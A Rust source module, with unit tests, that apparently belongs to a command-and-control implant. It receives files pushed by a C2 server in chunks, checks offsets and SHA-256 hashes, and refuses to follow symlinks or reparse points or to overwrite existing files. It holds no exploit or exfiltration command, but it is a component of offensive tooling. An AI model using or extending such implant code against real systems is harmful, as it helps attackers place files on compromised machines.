use sha2::{Digest, Sha256};
#[cfg(not(windows))]
use std::fs::OpenOptions;
use std::io::{Seek, SeekFrom, Write};
use std::path::PathBuf;
use std::sync::atomic::{AtomicBool, Ordering};

use nw_profile::msgs::{FileAck, FileChunk};
use uuid::Uuid;

/// One active upload (a file the C2 server is pushing to this implant). Owns
/// an append-mode writer and the next byte offset, so `nw/upload <dest>`
/// streams data across consecutive server pushes.
pub struct Upload {
    file: std::fs::File,
    partial_path: PathBuf,
    #[cfg(windows)]
    #[allow(dead_code)]
    sidecar_guard: WindowsPathGuard,
    pub dest: String,
    size: u64,
    total_known: bool,
    /// Highest contiguous byte written so far (acked to the server).
    received: u64,
    transfer_id: Uuid,
    task_id: Uuid,
    expected_sha256: Option<String>,
    #[cfg(test)]
    finalize_barriers: Option<(
        std::sync::Arc<std::sync::Barrier>,
        std::sync::Arc<std::sync::Barrier>,
    )>,
    #[cfg(test)]
    validation_channels: Option<(
        std::sync::mpsc::Sender<()>,
        std::sync::Arc<std::sync::Mutex<std::sync::mpsc::Receiver<()>>>,
    )>,
}

impl Upload {
    /// Create/append `dest` for a pushed file. Seeds `received` from the
    /// existing file's length so the server resumes from where it left off.
    pub fn open(dest: &str, transfer_id: Uuid, task_id: Uuid) -> Result<Self, String> {
        Self::open_with_total(dest, transfer_id, task_id, None, None)
    }

    pub fn open_with_total(
        dest: &str,
        transfer_id: Uuid,
        task_id: Uuid,
        expected_total: Option<u64>,
        expected_sha256: Option<String>,
    ) -> Result<Self, String> {
        if dest.trim().is_empty() {
            return Err("empty destination path".into());
        }
        // Never seed progress from an unrelated pre-existing destination.
        // A transfer-specific sidecar is the only resumable state.
        let partial_path = PathBuf::from(format!("{dest}.nwpart-{transfer_id}"));
        #[cfg(not(windows))]
        let file = open_sidecar(&partial_path)?;
        #[cfg(windows)]
        let (file, sidecar_guard) = open_sidecar(&partial_path)?;
        let received = file
            .metadata()
            .map_err(|e| format!("stat {dest:?}: {e}"))?
            .len();
        if expected_total.is_some_and(|total| received > total) {
            return Err("transfer sidecar exceeds authorized total".into());
        }
        Ok(Upload {
            file,
            partial_path,
            #[cfg(windows)]
            sidecar_guard,
            dest: dest.to_string(),
            size: expected_total.unwrap_or(received),
            total_known: expected_total.is_some(),
            received,
            transfer_id,
            task_id,
            expected_sha256,
            #[cfg(test)]
            finalize_barriers: None,
            #[cfg(test)]
            validation_channels: None,
        })
    }

    pub fn task_id(&self) -> Uuid {
        self.task_id
    }

    pub fn transfer_id(&self) -> Uuid {
        self.transfer_id
    }

    /// Current progress to report to the server next poll. Never reports
    /// `done` until a real total is known (a fresh, empty dest reports size 0).
    pub fn ack(&self) -> FileAck {
        FileAck {
            transfer_id: Some(self.transfer_id),
            received: self.received,
            total: if self.total_known { self.size } else { 0 },
            done: self.total_known && self.received >= self.size,
        }
    }

    /// Write one push chunk at its absolute offset, keeping `received` set to
    /// the highest contiguous offset. Returns a FileAck for the server.
    pub fn write_chunk(&mut self, chunk: &FileChunk) -> Result<FileAck, String> {
        if chunk.transfer_id != Some(self.transfer_id) {
            return Err("upload transfer id mismatch".into());
        }
        if chunk.task_id != Some(self.task_id) {
            return Err("upload task id mismatch".into());
        }
        if self.total_known && self.size != chunk.total {
            return Err("upload total mismatch".into());
        }
        self.size = chunk.total;
        self.total_known = true;
        if chunk.offset > self.received {
            return Err("upload chunk offset gap".into());
        }
        let end = chunk
            .offset
            .checked_add(chunk.data.len() as u64)
            .ok_or_else(|| "upload chunk offset overflow".to_owned())?;
        if end > self.size {
            return Err("upload chunk exceeds total".into());
        }
        if chunk.offset < self.received {
            if end > self.received {
                return Err("upload duplicate overlaps unreceived bytes".into());
            }
            self.file
                .seek(SeekFrom::Start(chunk.offset))
                .map_err(|_| "seek upload destination")?;
            let mut persisted = vec![0; chunk.data.len()];
            use std::io::Read;
            self.file
                .read_exact(&mut persisted)
                .map_err(|_| "read upload duplicate")?;
            if persisted != chunk.data {
                return Err("upload duplicate bytes mismatch".into());
            }
            return Ok(self.ack());
        }
        self.file
            .seek(SeekFrom::Start(chunk.offset))
            .map_err(|_| "seek upload destination")?;
        self.file
            .write_all(&chunk.data)
            .map_err(|_| "write upload destination")?;
        self.file
            .sync_all()
            .map_err(|_| "sync upload destination")?;
        if end > self.received {
            self.received = end;
        }
        Ok(FileAck {
            transfer_id: Some(self.transfer_id),
            received: self.received,
            total: self.size,
            done: self.received >= self.size,
        })
    }

    pub fn done(&self) -> bool {
        self.total_known && self.received >= self.size
    }

    /// Publish the transfer-specific sidecar after the server confirms the
    /// terminal ACK. Keeping it staged until then makes reconnects idempotent.
    pub fn finalize(&self) -> Result<(), String> {
        let cancelled = AtomicBool::new(false);
        self.finalize_with_cancellation(&cancelled)
    }

    pub fn finalize_with_cancellation(&self, cancelled: &AtomicBool) -> Result<(), String> {
        let validation = self.validate();
        if cancelled.load(Ordering::SeqCst) {
            remove_cancelled_sidecar(&self.partial_path, &self.file)?;
            return Err("task cancelled".into());
        }
        validation?;
        self.publish()
    }

    pub fn validate(&self) -> Result<(), String> {
        if !self.total_known
            || self
                .file
                .metadata()
                .map_err(|e| format!("stat upload sidecar: {e}"))?
                .len()
                != self.size
        {
            return Err("upload sidecar size mismatch".into());
        }
        let integrity = if let Some(expected) = &self.expected_sha256 {
            let mut file = self
                .file
                .try_clone()
                .map_err(|e| format!("open upload sidecar: {e}"))?;
            file.seek(SeekFrom::Start(0))
                .map_err(|e| format!("seek upload sidecar: {e}"))?;
            let mut digest = Sha256::new();
            let mut buffer = [0_u8; 8192];
            loop {
                let count = std::io::Read::read(&mut file, &mut buffer)
                    .map_err(|e| format!("hash upload: {e}"))?;
                if count == 0 {
                    break;
                }
                digest.update(&buffer[..count]);
            }
            if hex::encode(digest.finalize()) == expected.to_ascii_lowercase() {
                Ok(())
            } else {
                Err("upload SHA-256 mismatch".into())
            }
        } else {
            Ok(())
        };
        #[cfg(test)]
        if let Some((reached, release)) = &self.finalize_barriers {
            reached.wait();
            release.wait();
        }
        #[cfg(test)]
        if let Some((reached, release)) = &self.validation_channels {
            let _ = reached.send(());
            let _ = release.lock().unwrap().recv();
        }
        integrity
    }

    pub fn publish(&self) -> Result<(), String> {
        // hard_link is an atomic create-without-replace on local filesystems:
        // an existing destination is never truncated or overwritten.
        publish_no_replace(
            &self.partial_path,
            &PathBuf::from(&self.dest),
            #[cfg(windows)]
            &self.file,
        )?;
        #[cfg(windows)]
        {
            let _ = self.sidecar_guard.parent.sync_all();
        }
        if let Some(parent) = std::path::Path::new(&self.dest).parent() {
            if let Ok(directory) = std::fs::File::open(parent) {
                let _ = directory.sync_all();
            }
        }
        Ok(())
    }

    pub fn cancel(self) -> Result<(), String> {
        remove_cancelled_sidecar(&self.partial_path, &self.file)
    }

    #[cfg(test)]
    pub(crate) fn set_finalize_barriers(
        &mut self,
        reached: std::sync::Arc<std::sync::Barrier>,
        release: std::sync::Arc<std::sync::Barrier>,
    ) {
        self.finalize_barriers = Some((reached, release));
    }

    #[cfg(test)]
    pub(crate) fn set_validation_channels(
        &mut self,
        reached: std::sync::mpsc::Sender<()>,
        release: std::sync::mpsc::Receiver<()>,
    ) {
        self.validation_channels =
            Some((reached, std::sync::Arc::new(std::sync::Mutex::new(release))));
    }
}

#[cfg(not(windows))]
fn remove_cancelled_sidecar(
    partial_path: &std::path::Path,
    _source: &std::fs::File,
) -> Result<(), String> {
    match std::fs::remove_file(partial_path) {
        Ok(()) => Ok(()),
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => Ok(()),
        Err(error) => Err(format!("remove cancelled upload sidecar: {error}")),
    }
}

#[cfg(windows)]
fn remove_cancelled_sidecar(
    _partial_path: &std::path::Path,
    source: &std::fs::File,
) -> Result<(), String> {
    use std::os::windows::io::AsRawHandle;
    use windows_sys::Win32::Storage::FileSystem::{
        FILE_DISPOSITION_INFO, FileDispositionInfo, SetFileInformationByHandle,
    };

    let info = FILE_DISPOSITION_INFO { DeleteFile: true };
    if unsafe {
        SetFileInformationByHandle(
            source.as_raw_handle() as _,
            FileDispositionInfo,
            &info as *const _ as _,
            std::mem::size_of::<FILE_DISPOSITION_INFO>(),
        )
    } == 0
    {
        return Err(format!(
            "remove cancelled upload sidecar: {}",
            std::io::Error::last_os_error()
        ));
    }
    Ok(())
}

#[cfg(not(windows))]
fn open_sidecar(path: &std::path::Path) -> Result<std::fs::File, String> {
    let mut options = OpenOptions::new();
    options.create(true).read(true).write(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        options.custom_flags(libc::O_NOFOLLOW);
    }
    options
        .open(path)
        .map_err(|error| format!("open {path:?}: {error}"))
}

#[cfg(not(windows))]
fn publish_no_replace(
    partial: &std::path::Path,
    destination: &std::path::Path,
    #[cfg(windows)] source: &std::fs::File,
) -> Result<(), String> {
    std::fs::hard_link(partial, destination)
        .map_err(|error| format!("publish upload destination: {error}"))?;
    std::fs::remove_file(partial).map_err(|error| format!("remove upload sidecar: {error}"))
}

#[cfg(windows)]
fn open_sidecar(path: &std::path::Path) -> Result<(std::fs::File, WindowsPathGuard), String> {
    use std::os::windows::ffi::OsStrExt;
    use std::os::windows::io::FromRawHandle;
    use windows_sys::Win32::Foundation::{
        CloseHandle, GENERIC_READ, GENERIC_WRITE, INVALID_HANDLE_VALUE,
    };
    use windows_sys::Win32::Storage::FileSystem::{
        CreateFileW, DELETE, FILE_ATTRIBUTE_NORMAL, FILE_FLAG_OPEN_REPARSE_POINT,
        FILE_FLAG_WRITE_THROUGH, FILE_SHARE_READ, FILE_SHARE_WRITE, OPEN_ALWAYS,
    };

    let guard = WindowsPathGuard::open(path)?;
    let wide: Vec<u16> = path.as_os_str().encode_wide().chain(Some(0)).collect();
    let handle = unsafe {
        CreateFileW(
            wide.as_ptr(),
            GENERIC_READ | GENERIC_WRITE | DELETE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            std::ptr::null(),
            OPEN_ALWAYS,
            FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OPEN_REPARSE_POINT | FILE_FLAG_WRITE_THROUGH,
            std::ptr::null_mut(),
        )
    };
    if handle == INVALID_HANDLE_VALUE {
        return Err(format!(
            "open {path:?}: {}",
            std::io::Error::last_os_error()
        ));
    }
    if windows_handle_is_reparse(handle) {
        unsafe { CloseHandle(handle) };
        return Err(format!("reparse point in upload sidecar {path:?}"));
    }
    // SAFETY: CreateFileW returned an owned, valid file handle.
    Ok((
        unsafe { std::fs::File::from_raw_handle(handle as _) },
        guard,
    ))
}

#[cfg(windows)]
fn publish_no_replace(
    partial: &std::path::Path,
    destination: &std::path::Path,
    source: &std::fs::File,
) -> Result<(), String> {
    use std::os::windows::ffi::OsStrExt;
    use std::os::windows::io::AsRawHandle;
    use windows_sys::Win32::Storage::FileSystem::{
        CreateHardLinkW, FILE_DISPOSITION_INFO, FileDispositionInfo, SetFileInformationByHandle,
    };

    let _partial_guard = WindowsPathGuard::open(partial)?;
    let _destination_guard = WindowsPathGuard::open(destination)?;
    let partial_w: Vec<u16> = partial.as_os_str().encode_wide().chain(Some(0)).collect();
    let destination_w: Vec<u16> = destination
        .as_os_str()
        .encode_wide()
        .chain(Some(0))
        .collect();
    if windows_handle_is_reparse(source.as_raw_handle() as _) {
        return Err("upload sidecar is a reparse point".into());
    }
    let result =
        unsafe { CreateHardLinkW(destination_w.as_ptr(), partial_w.as_ptr(), std::ptr::null()) };
    if result == 0 {
        return Err(format!(
            "publish upload destination: {}",
            std::io::Error::last_os_error()
        ));
    }
    // Mark the already-opened source for deletion. Reopening the pathname
    // here would turn cleanup into a reparse/ancestor race.
    let info = FILE_DISPOSITION_INFO { DeleteFile: true };
    let removed = unsafe {
        SetFileInformationByHandle(
            source.as_raw_handle() as _,
            FileDispositionInfo,
            &info as *const _ as _,
            std::mem::size_of::<windows_sys::Win32::Storage::FileSystem::FILE_DISPOSITION_INFO>()
                as u32,
        )
    };
    if removed == 0 {
        return Err(format!(
            "remove upload sidecar: {}",
            std::io::Error::last_os_error()
        ));
    }
    Ok(())
}

#[cfg(windows)]
#[allow(dead_code)]
struct WindowsPathGuard {
    handles: Vec<std::fs::File>,
    parent: std::fs::File,
    path: std::path::PathBuf,
}

#[cfg(windows)]
impl WindowsPathGuard {
    fn open(path: &std::path::Path) -> Result<Self, String> {
        use std::os::windows::ffi::OsStrExt;
        use std::os::windows::io::FromRawHandle;
        use windows_sys::Win32::Foundation::{CloseHandle, GENERIC_READ, INVALID_HANDLE_VALUE};
        use windows_sys::Win32::Storage::FileSystem::{
            CreateFileW, FILE_ATTRIBUTE_NORMAL, FILE_FLAG_BACKUP_SEMANTICS,
            FILE_FLAG_OPEN_REPARSE_POINT, FILE_SHARE_READ, FILE_SHARE_WRITE, OPEN_EXISTING,
        };

        let mut ancestors = Vec::new();
        let mut current = path
            .parent()
            .ok_or_else(|| format!("missing upload parent for {path:?}"))?;
        loop {
            ancestors.push(current.to_owned());
            let Some(parent) = current.parent() else {
                break;
            };
            if parent == current {
                break;
            }
            current = parent;
        }
        ancestors.reverse();
        let mut handles = Vec::new();
        for ancestor in ancestors {
            let wide: Vec<u16> = ancestor.as_os_str().encode_wide().chain(Some(0)).collect();
            let handle = unsafe {
                CreateFileW(
                    wide.as_ptr(),
                    GENERIC_READ,
                    FILE_SHARE_READ | FILE_SHARE_WRITE,
                    std::ptr::null(),
                    OPEN_EXISTING,
                    FILE_ATTRIBUTE_NORMAL
                        | FILE_FLAG_BACKUP_SEMANTICS
                        | FILE_FLAG_OPEN_REPARSE_POINT,
                    std::ptr::null_mut(),
                )
            };
            if handle == INVALID_HANDLE_VALUE {
                return Err(format!(
                    "open upload ancestor {ancestor:?}: {}",
                    std::io::Error::last_os_error()
                ));
            }
            if windows_handle_is_reparse(handle) {
                unsafe { CloseHandle(handle) };
                return Err(format!(
                    "reparse point in upload path ancestor {ancestor:?}"
                ));
            }
            // SAFETY: CreateFileW returned an owned directory handle.
            handles.push(unsafe { std::fs::File::from_raw_handle(handle as _) });
        }
        let parent = handles
            .pop()
            .ok_or_else(|| format!("missing upload parent for {path:?}"))?;
        Ok(Self {
            handles,
            parent,
            path: path.to_path_buf(),
        })
    }
}

#[cfg(windows)]
fn windows_handle_is_reparse(handle: windows_sys::Win32::Foundation::HANDLE) -> bool {
    use windows_sys::Win32::Storage::FileSystem::{
        BY_HANDLE_FILE_INFORMATION, FILE_ATTRIBUTE_REPARSE_POINT, GetFileInformationByHandle,
    };
    let mut info = BY_HANDLE_FILE_INFORMATION::default();
    let ok = unsafe { GetFileInformationByHandle(handle, &mut info) };
    ok == 0 || info.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT != 0
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn writes_and_acks_contiguous() {
        let dir = std::env::temp_dir();
        let dest = dir.join(format!("nw-up-test-{}.bin", std::process::id()));
        let _ = std::fs::remove_file(&dest);

        let transfer_id = Uuid::new_v4();
        let task_id = Uuid::new_v4();
        let mut up = Upload::open(dest.to_str().unwrap(), transfer_id, task_id).unwrap();
        let data: Vec<u8> = (0..100u32).map(|i| (i % 251) as u8).collect();
        let ack = up
            .write_chunk(&FileChunk {
                transfer_id: Some(transfer_id),
                task_id: Some(task_id),
                name: dest.to_str().unwrap().to_string(),
                offset: 0,
                total: 100,
                data: data.clone(),
            })
            .unwrap();
        assert_eq!(ack.received, 100);
        assert!(ack.done);
        assert!(
            !dest.exists(),
            "receiver must not expose a progressively written final path"
        );

        // A chunk starting before the acked offset must not shrink it.
        let duplicate_mismatch = up
            .write_chunk(&FileChunk {
                transfer_id: Some(transfer_id),
                task_id: Some(task_id),
                name: String::new(),
                offset: 40,
                total: 100,
                data: vec![9u8; 20],
            })
            .unwrap_err();
        assert_eq!(duplicate_mismatch, "upload duplicate bytes mismatch");

        let gap = up
            .write_chunk(&FileChunk {
                transfer_id: Some(transfer_id),
                task_id: Some(task_id),
                name: String::new(),
                offset: 101,
                total: 100,
                data: vec![1],
            })
            .unwrap_err();
        assert_eq!(gap, "upload chunk offset gap");

        let mismatch = up
            .write_chunk(&FileChunk {
                transfer_id: Some(Uuid::new_v4()),
                task_id: Some(task_id),
                name: String::new(),
                offset: 100,
                total: 101,
                data: vec![1],
            })
            .unwrap_err();
        assert_eq!(mismatch, "upload transfer id mismatch");

        std::fs::remove_file(&dest).ok();
    }

    #[test]
    fn preexisting_or_reparse_destination_is_never_modified() {
        let dir = tempfile::tempdir().unwrap();
        let dest = dir.path().join("destination.bin");
        std::fs::write(&dest, b"old").unwrap();
        let transfer_id = Uuid::new_v4();
        let task_id = Uuid::new_v4();
        let mut up = Upload::open(dest.to_str().unwrap(), transfer_id, task_id).unwrap();
        up.write_chunk(&FileChunk {
            transfer_id: Some(transfer_id),
            task_id: Some(task_id),
            name: dest.to_string_lossy().into_owned(),
            offset: 0,
            total: 3,
            data: b"new".to_vec(),
        })
        .unwrap();
        let error = up.finalize().unwrap_err();
        assert!(error.contains("publish upload destination"));
        assert_eq!(std::fs::read(&dest).unwrap(), b"old");
        let partial = dir
            .path()
            .join(format!("destination.bin.nwpart-{transfer_id}"));
        assert_eq!(std::fs::read(&partial).unwrap(), b"new");
        let entries = std::fs::read_dir(dir.path())
            .unwrap()
            .map(|entry| entry.unwrap().path())
            .filter(|path| std::fs::read(path).ok().as_deref() == Some(b"new"))
            .collect::<Vec<_>>();
        assert_eq!(entries, vec![partial]);

        #[cfg(unix)]
        {
            let victim = dir.path().join("victim.bin");
            let reparse_destination = dir.path().join("reparse-destination.bin");
            std::fs::write(&victim, b"victim").unwrap();
            std::os::unix::fs::symlink(&victim, &reparse_destination).unwrap();
            let reparse_transfer = Uuid::new_v4();
            let mut reparse_upload = Upload::open(
                reparse_destination.to_str().unwrap(),
                reparse_transfer,
                task_id,
            )
            .unwrap();
            reparse_upload
                .write_chunk(&FileChunk {
                    transfer_id: Some(reparse_transfer),
                    task_id: Some(task_id),
                    name: reparse_destination.to_string_lossy().into_owned(),
                    offset: 0,
                    total: 3,
                    data: b"new".to_vec(),
                })
                .unwrap();
            assert!(reparse_upload.finalize().is_err());
            assert_eq!(std::fs::read(victim).unwrap(), b"victim");
            assert_eq!(
                std::fs::read(
                    dir.path()
                        .join(format!("reparse-destination.bin.nwpart-{reparse_transfer}")),
                )
                .unwrap(),
                b"new"
            );
        }
    }
}
